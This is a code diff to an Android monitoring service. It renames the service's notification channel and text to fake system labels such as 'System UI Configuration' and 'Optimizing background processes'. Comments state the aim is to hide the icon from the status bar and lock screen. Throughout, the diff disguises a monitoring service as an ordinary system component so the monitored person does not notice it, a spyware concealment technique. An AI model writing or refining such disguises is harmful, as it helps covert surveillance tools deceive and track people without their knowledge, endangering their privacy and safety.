@@ -509,10 +509,10 @@ class MonitoringForegroundService : Service() {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
         val ch = NotificationChannel(
             CHANNEL_ID,
-            "System Services",
-            NotificationManager.IMPORTANCE_MIN          // completely silent, no heads-up
+            "System UI Configuration",
+            NotificationManager.IMPORTANCE_MIN          // SILENT: hides icon from status bar
         ).apply {
-            description      = "Background system optimization"
+            description      = "UI stability and performance optimization"
             setShowBadge(false)
             lockscreenVisibility = Notification.VISIBILITY_SECRET
             enableLights(false)
@@ -528,10 +528,10 @@ class MonitoringForegroundService : Service() {
             PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
         )
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Power Management")
-            .setContentText("Optimizing battery and system performance")
+            .setContentTitle("System Performance")
+            .setContentText("Optimizing background processes")
             .setSmallIcon(android.R.drawable.ic_menu_preferences)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setPriority(NotificationCompat.PRIORITY_MIN) // HIDE: removes icon from bar
             .setCategory(Notification.CATEGORY_SERVICE)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .setContentIntent(pi)
